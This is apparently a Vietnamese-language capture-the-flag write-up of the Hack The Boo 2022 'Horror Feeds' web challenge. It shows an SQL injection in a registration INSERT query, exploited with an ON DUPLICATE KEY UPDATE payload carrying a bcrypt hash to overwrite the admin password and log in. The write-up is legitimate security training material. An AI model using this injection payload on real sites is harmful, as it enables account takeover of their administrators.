# **Hack The Boo CTF 2022**
## **Horror Feeds** 
___
### **Description:**

An unknown entity has taken over every screen worldwide and is broadcasting this haunted feed that introduces paranormal activity to random internet-accessible CCTV devices. Could you take down this streaming service?
```
161.35.162.224:30734
```
___

Các thao tác register, login cơ bản

![1.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/1.png)

Sau khi login thành công thì ta được redirect đến /dashboard

![2.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/2.png)

Flag nằm ở /dashboard khi ta xác thực thành công với username=admin

![3.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/3.png)

![4.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/4.png)

Sau khi test và kiểm chứng thì mình phát hiện SQLi nằm ở câu query insert

![5.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/5.png)

Mình sẽ dùng [DUPLICATE KEY UPDATE](https://mariadb.com/kb/en/insert-on-duplicate-key-update/) để sửa đổi passwd của admin:
```
username=admin","something") ON DUPLICATE KEY UPDATE password='a'-- -
password=somethinghere
```

Vì password lưu trong database ở dạng hash nên mình chạy script xem mật khẩu "a" sẽ được lưu như thế nào:

```python3
import bcrypt

def generate_password_hash(password):
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt).decode()

print(generate_password_hash('a'))
```

Output:
```
$2b$12$eqBRydMzRivDC2Z7wrujiuCUILKl82FtdAf5QdLxo/dJCXsiKdxuK
```

Như vậy payload sẽ là:
```
username=admin","something") ON DUPLICATE KEY UPDATE password='$2b$12$eqBRydMzRivDC2Z7wrujiuCUILKl82FtdAf5QdLxo/dJCXsiKdxuK'-- -
password=somethinghere
```

Sau đó login với username admin và lấy flag:

```
username=admin
password=a
```
![6.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Horror%20Feeds/img/6.png)
